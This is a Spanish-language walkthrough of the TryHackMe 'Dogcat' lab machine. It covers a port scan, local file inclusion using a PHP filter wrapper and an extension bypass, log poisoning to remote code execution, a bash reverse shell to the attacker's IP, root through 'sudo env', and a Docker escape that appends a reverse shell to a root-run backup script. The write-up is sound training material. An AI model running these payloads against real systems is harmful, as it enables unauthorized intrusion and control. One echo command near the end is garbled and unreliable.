---
title: Dogcat - TryHackMe
layout: post
permalink: /writeups/THM/dogcat
date: 2025-04-07 11:00:00 -0000
description: >
  Write up en español para Dogcat - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sV -Pn -T4 -O 10.10.54.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 16:16 CEST
Nmap scan report for 10.10.54.149
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Portal web

![alt text](/assets/img/writeups/tryhackme/dogcat/image.png)

Al dar click en **dog** o **cat** nos muestra una imagen en consecuencia.

En el parámetro php que indica dog/cat tenemos un potencial path traversal.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-1.png)

El problema es que parece estar añadiendo la terminación .php al final del parámetro por lo que no encuentra el archivo y por eso tenemos error.

Aprovechando que podemos pasar argumentos antes del parámetro podemos intentar exfiltrar datos a través de un [wrapper PHP](https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55).

![alt text](/assets/img/writeups/tryhackme/dogcat/image-2.png)

Aunque el concepto es correcto y debería mostrar el contenido del index.php codificado en base64 indica que no encuentra el archivo.
Bien, el problema es dado por como PHP trata de introducir la extensión .php al final del parámetro.

### ¿Qué es `&ext=` y por qué hace que funcione?

Ese `&ext=` **no forma parte del wrapper**,es un **"bypass" para el parseo del parámetro `view`** en la aplicación.

- En la app PHP, probablemente hay algo como esto:

```php
include($_GET['view'] . '.php');
```

- Si pasas:

```
?view=php://filter/read=convert.base64-encode/resource=etc/passwd
```

PHP lo intentará incluir como:

```
include("php://filter/read=convert.base64-encode/resource=etc/passwd.php");
```

Ese `.php` final rompe el wrapper porque **no puedes añadir `.php` a un stream de filtro como `php://filter`**.

Entonces al añadir `&ext=`, el código está haciendo algo como esto:

```php
include($_GET['view'] . $_GET['ext']);
```

Y puedes entonces controlar **qué extensión se le pone (o incluso ninguna)**. Así:

```
?view=php://filter/read=convert.base64-encode/resource=/var/www/html/index&ext=
```

→ Esto se concatena como:

```php
include("php://filter/read=convert.base64-encode/resource=/var/www/html/index");
```

Y eso **ya es válido**, porque no rompe el esquema del wrapper.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-3.png)

Este archivo no muestra datos demasiado útiles solo que no parece haber usuarios interesantes en el sistema.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-4.png)


> Nota: Parece que el wrapper no es necesario ya que el único problema era la extensión que añadía al final del parámetro por lo que no es necesario codificar en base64.
{: .prompt-info }

![alt text](/assets/img/writeups/tryhackme/dogcat/image-5.png)

Lo importante aquí es que podemos visualizar logs del sistema, lo que hace a la máquina susceptible de un log poisoning.

Para aprovechar esto vamos a inyectar codigo PHP en el user agent de una de nuestras peticiones para crear un parámetro nuevo en el index que nos permita ejecutar código.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-6.png)

Ahora al volver a ejecutar la petición para extraer el contenido de los logs vemos que nos da un error de que no puede ejecutar el comando en blanco, esto es buena señal.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-7.png)

Si le pasamos el parámetro cmd por url.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-8.png)

Tenemos RCE.

## Reverse shell

```bash
bash -c 'bash -i >& /dev/tcp/10.23.66.202/4444 0>&1'
```

Lo codificamos en URL.

```plaintext
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.23.66.202%2F4444%200%3E%261%27
```

![alt text](/assets/img/writeups/tryhackme/dogcat/image-9.png)

![alt text](/assets/img/writeups/tryhackme/dogcat/image-10.png)

Como la máquina no tiene python para estabilizar un poco la shell ejecutamos:

```bash
script /dev/null -c bash
export TERM=xterm
```

![alt text](/assets/img/writeups/tryhackme/dogcat/image-11.png)

## Escalado de privilegios

Si recordamos en el sistema no hay usuarios creados.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-12.png)

Por lo que vamos directamente a intentar escalar privilegios a root.

Por suerte podemos ejecutar `sudo -`

```bash
www-data@c29ed5a125d4:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on c29ed5a125d4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on c29ed5a125d4:
    (root) NOPASSWD: /usr/bin/env
```

env es una utilidad estándar en Unix que:

- Ejecuta un programa en un entorno modificado.

- Se suele usar para lanzar scripts con el intérprete correcto.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-13.png)

En este caso pues la escalada es bastante sencilla ya que podemos ejecutar el comando `env` con el parámetro `bash` y obtener un shell. Consultamos [GTOBins](https://gtfobins.github.io/gtfobins/env/)

```bash
sudo /usr/bin/env /bin/bash
```

![alt text](/assets/img/writeups/tryhackme/dogcat/image-14.png)

Las tres primeras flags las tenemos aquí.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-15.png)

La última flag es algo "compleja".

Si nos fijamos (además de que lo dice en el reto) el id del host donde somos root es un string id similar a los que genera Docker. Por lo que estamos en un entorno de Docker.

Para escapar podemos navegar a `/opt/backups`.

![alt text](/assets/img/writeups/tryhackme/dogcat/image-16.png)

Encontramos un script que hace un backup completo del contenedor por lo que debe estar siendo ejecutado por el usuario root del host viendo la ruta en la que se encuentra este.

```bash
 echo "bash -i >& /dev/tcp/10.23.66.202/9999 0>&1" >> backup.sh
" > backup.sh >& /dev/tcp/10.23.66.202/9999 0>&1"
``` 

![alt text](/assets/img/writeups/tryhackme/dogcat/image-17.png)

![alt text](/assets/img/writeups/tryhackme/dogcat/image-18.png)


